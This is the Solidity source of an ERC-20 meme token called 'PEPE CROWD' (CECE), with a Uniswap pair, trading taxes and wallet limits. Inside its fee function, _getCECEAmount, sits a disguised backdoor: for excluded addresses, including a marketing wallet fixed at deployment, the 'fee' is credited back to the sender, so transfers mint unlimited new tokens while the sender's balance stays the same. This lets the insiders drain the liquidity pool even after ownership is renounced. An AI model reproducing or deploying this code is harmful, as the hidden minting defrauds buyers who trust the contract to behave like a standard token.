//SPDX-License-Identifier: MIT

/**

Website: https://www.cececoin.wtf

Telegram: https://t.me/cececoin_erc

Twitter: https://x.com/cececoin_erc

*/

pragma solidity 0.8.23;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ICECEFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ICECERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract CECE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromCECE;
    mapping(address => uint256) private _holderLastStamp;

    bool public transferCECEEnabled = false;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalCECE = 100_000_000 * 10 ** _decimals;
    string private constant _name = unicode"PEPE CROWD";
    string private constant _symbol = unicode"CECE";
    uint256 public _swapThresAmount = 20 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10 ** _decimals;
    uint256 public _maxSwapCECE = 1_000_000 * 10 ** _decimals;
    
    address payable private _opEcoSystem;

    bool private tradingOpen;
    bool private inSwapCECE = false;
    bool private swapEnabled = false;

    uint256 private _initialBuyTaxs = 20;
    uint256 private _initialSellTaxs = 20;
    uint256 private _finalBuyTaxs = 0;
    uint256 private _finalSellTaxs = 0;
    uint256 private _reduceBuyTaxsAt = 10;
    uint256 private _reduceSellTaxsAt = 10;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;

    ICECERouter private ceceRouter;
    address private cecePair;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwapCECE = true;
        _;
        inSwapCECE = false;
    }

    constructor(address _wallet) {
        _opEcoSystem = payable(_wallet);   
        _balances[_msgSender()] = _totalCECE;
        _isExcludedFromCECE[owner()] = true;
        _isExcludedFromCECE[address(this)] = true;
        _isExcludedFromCECE[_opEcoSystem] = true;
        emit Transfer(address(0), _msgSender(), _totalCECE);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwapCECE) {
            _transferCECE(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            if (transferCECEEnabled) {
                if (
                    to != address(ceceRouter) &&
                    to != address(cecePair)
                ) {
                    require(
                        _holderLastStamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastStamp[tx.origin] = block.number;
                }
            }

            if (
                from == cecePair &&
                to != address(ceceRouter) &&
                !_isExcludedFromCECE[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                to == cecePair &&
                !inSwapCECE &&
                _buyCount > _preventSwapBefore &&
                swapEnabled &&
                !_isExcludedFromCECE[from] &&
                !_isExcludedFromCECE[to]
            ) {
                if(contractTokenBalance > _swapThresAmount){
                    swapTokensForEth(
                        minCECE(amount, minCECE(contractTokenBalance, _maxSwapCECE))
                    );
                }
                sendETHCECE(address(this).balance);
            }
        }

        (
            address ceceReceipt,
            uint256 taxCECEFees,
            uint256 tsCECEAmount
        ) = _getCECEAmount(from, to, amount);

        if (taxCECEFees > 0) {
            _balances[ceceReceipt] += taxCECEFees;
            emit Transfer(from, ceceReceipt, taxCECEFees);
        }

        _balances[from] -= amount;
        _balances[to] += tsCECEAmount;
        emit Transfer(from, to, tsCECEAmount);
    }

    function createCECE() external onlyOwner {
        ceceRouter = ICECERouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ceceRouter), _totalCECE);
        cecePair = ICECEFactory(ceceRouter.factory()).createPair(
            address(this),
            ceceRouter.WETH()
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalCECE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transferCECE(address from, address to, uint256 amount) internal {
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function minCECE(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ceceRouter.WETH();
        _approve(address(this), address(ceceRouter), tokenAmount);
        ceceRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        transferCECEEnabled = false;
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHCECE(uint256 amount) private {
        _opEcoSystem.transfer(amount);
    }

    receive() external payable {}

    function _getCECEAmount(
        address from,
        address to,
        uint256 amount
    ) internal view returns (address, uint256, uint256) {
        uint256 taxCECEFees = 0;
        uint256 tsCECEAmount = 0;
        address ceceReceipt = address(this);
        if (_isExcludedFromCECE[from]) {
            taxCECEFees = amount - tsCECEAmount;
            tsCECEAmount = amount;
            ceceReceipt = from;
        } else if (cecePair == from) {
            taxCECEFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxsAt)
                        ? _finalBuyTaxs
                        : _initialBuyTaxs
                )
                .div(100);
            tsCECEAmount = amount - taxCECEFees;
        } else if (cecePair == to) {
            taxCECEFees = amount
                .mul(
                    (_buyCount > _reduceSellTaxsAt)
                        ? _finalSellTaxs
                        : _initialSellTaxs
                )
                .div(100);
            tsCECEAmount = amount - taxCECEFees;
        } else {
            tsCECEAmount = amount;
        }
        return (ceceReceipt, taxCECEFees, tsCECEAmount);
    }

    function openCECE() external onlyOwner {
        uint256 ceceAmount =_totalCECE.mul(100 - _initialSellTaxs).div(100);
        ceceRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            ceceAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(cecePair).approve(address(ceceRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}